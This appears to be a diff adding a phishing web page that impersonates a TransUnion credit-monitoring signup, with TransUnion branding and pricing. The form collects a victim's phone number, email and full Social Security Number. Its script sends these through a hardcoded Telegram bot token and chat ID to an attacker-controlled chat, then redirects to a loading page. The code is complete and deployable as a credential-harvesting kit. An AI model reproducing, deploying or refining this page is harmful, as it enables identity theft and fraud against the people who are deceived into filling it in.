@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Credit Monitoring Signup</title>
+  <style>
+    :root {
+      --primary: #005b89;
+      --accent: #fde047;
+      --hover: #fdba74;
+      --text: #155e75;
+      --bg-light: #f3f4f6;
+      --border: #ccc;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      color: #333;
+    }
+
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 2rem 1rem;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 1rem;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo {
+      width: 140px;
+    }
+
+    .progress-container {
+      background: var(--bg-light);
+      border-radius: 999px;
+      height: 10px;
+      overflow: hidden;
+      margin-top: 1rem;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: var(--primary);
+      transition: width 0.4s ease;
+    }
+
+    .main-title {
+      color: var(--text);
+      font-size: 2rem;
+      margin-top: 1rem;
+    }
+
+    .row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 2rem;
+      margin-top: 2rem;
+    }
+
+    .col {
+      flex: 1;
+      min-width: 280px;
+    }
+
+    .input {
+      width: 100%;
+      padding: 0.75rem;
+      margin-top: 0.75rem;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      font-size: 1rem;
+    }
+
+    .input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(0, 91, 137, 0.3);
+      outline: none;
+    }
+
+    .info-box {
+      background-color: #2e1065;
+      color: #fff;
+      padding: 1rem;
+      border-radius: 8px;
+      margin-top: 2rem;
+    }
+
+    .button {
+      background-color: var(--accent);
+      color: #000;
+      border: none;
+      padding: 0.75rem 1rem;
+      border-radius: 9999px;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 1.5rem;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: var(--hover);
+    }
+
+    .footer {
+      font-size: 0.75rem;
+      color: #666;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      justify-content: space-between;
+      margin-top: 2rem;
+      padding-top: 2rem;
+      border-top: 1px solid #eee;
+    }
+
+    ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    ul li::before {
+      content: '✅';
+      margin-right: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="https://i.ibb.co/Sw6P1yhc/download-18.png" alt="Logo" class="logo" />
+  </div>
+
+  <div class="container">
+    <h3>Step 1 : Find Your Info</h3>
+    <div class="progress-container">
+      <div class="progress-bar" id="progress"></div>
+    </div>
+    <p id="progress-text" style="font-size: 0.9rem; color: gray;">0% completed</p>
+
+    <h1 class="main-title">Your scores, reports & monitoring are moments away</h1>
+
+    <div class="row">
+      <div class="col">
+        <label>Mobile phone number</label>
+        <input id="phone" type="tel" class="input" placeholder="(XXX) XXX-XXXX" />
+
+        <label>Email address</label>
+        <input id="email" type="email" class="input" placeholder="example@mail.com" />
+
+        <label>Social Security Number</label>
+        <input id="ssn" type="text" maxlength="9" class="input" placeholder="9-digit SSN" />
+
+        <p style="font-size: 0.85rem; color: var(--text);">
+          By providing the 9 digits of your social security number, we can better protect your information and identity.
+        </p>
+
+        <button class="button" id="submitBtn">🔒 Get Started</button>
+      </div>
+
+      <div class="col">
+        <h3 style="color: var(--text);">TransUnion Credit Premium for $9.95/ (21 Day )</h3>
+        <ul>
+          <li>Quarterly 3-Bureau scores, reports, and insights</li>
+          <li>3-Bureau monitoring, alerts, tips & tools</li>
+          <li>Personalized offers based on your credit profile</li>
+          <li>ID theft restoration and $1,000,000 ID theft insurance</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="info-box">
+      <h2>What You Need to Know:</h2>
+      <p>The credit scores provided are based on the VantageScore® 3.0 model.</p>
+    </div>
+
+    <div class="footer">
+      <span>© 2025 TransUnion Interactive, Inc. All Rights Reserved</span>
+      <span>Terms of Service | Privacy Notice | Your Privacy Choices | Provider Terms</span>
+    </div>
+  </div>
+
+  <script>
+    // Progress bar animation
+    let value = 0;
+    const progressBar = document.getElementById('progress');
+    const progressText = document.getElementById('progress-text');
+
+    const timer = setInterval(() => {
+      if (value < 40) {
+        value += 10;
+        progressBar.style.width = value + '%';
+        progressText.innerText = value + '% completed';
+      } else {
+        clearInterval(timer);
+      }
+    }, 500);
+
+    const botToken = '7752649046:AAH04kE54l4VAwuuilM_xv83ngBuzzVBYj8'; // replace with your bot token
+    const chatId = '5349147090'; // replace with your chat ID
+
+    document.getElementById('submitBtn').addEventListener('click', () => {
+      const phone = document.getElementById('phone').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const ssn = document.getElementById('ssn').value.trim();
+
+      if (!phone || !email || !ssn) {
+        alert('Please fill in all fields.');
+        return;
+      }
+
+      const message = `📋 *New Credit Signup*\n\n📱 *Phone:* ${phone}\n📧 *Email:* ${email}\n🔐 *SSN:* ${ssn}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      }).then(res => {
+        if (res.ok) {
+          window.location.href = 'loadingpage.html';
+        } else {
+          alert('Failed to send to Telegram.');
+        }
+      }).catch(err => {
+        console.error('Telegram error:', err);
+        alert('Telegram error occurred.');
+      });
+    });
+  </script>
+</body>
+</html>
